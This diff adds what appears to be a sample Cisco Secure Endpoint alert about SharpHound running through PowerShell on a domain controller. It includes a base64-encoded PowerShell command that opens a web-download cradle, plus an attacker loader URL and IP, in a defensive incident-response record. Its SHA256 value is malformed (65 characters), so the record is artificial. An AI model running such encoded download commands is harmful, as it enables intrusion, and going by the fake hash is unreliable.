@@ -1,0 +1,22 @@
+Cisco Secure Endpoint Detection
+Timestamp: 2026-07-21T14:22:07Z
+Computer.Hostname: FIN-DC-01
+User: backup_EA
+Detection: Suspicious PowerShell Execution
+Threat Name: Win.HackTool.SharpHound
+Parent Process: wsmprovhost.exe
+Process: powershell.exe
+Command Line: powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA
+File: C:\Users\backup_EA\Downloads\sh.exe
+SHA256: 6f5e8b7b2f0c3d4e5a1b8c9d0e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1
+Action: Quarantined
+
+MITRE: T1059.001 T1087 T1021.006
+
+Historical: A related detection Win.Banker.Emotet was quarantined on this host on 2026-07-10 (INC00089142).
+
+References:
+https://amp.cisco.com/investigate/inbox
+https://umbrella.com/policies
+Attacker URL: https://185.142.223.12/loader.php
+Attacker IP: 185.142.223.12
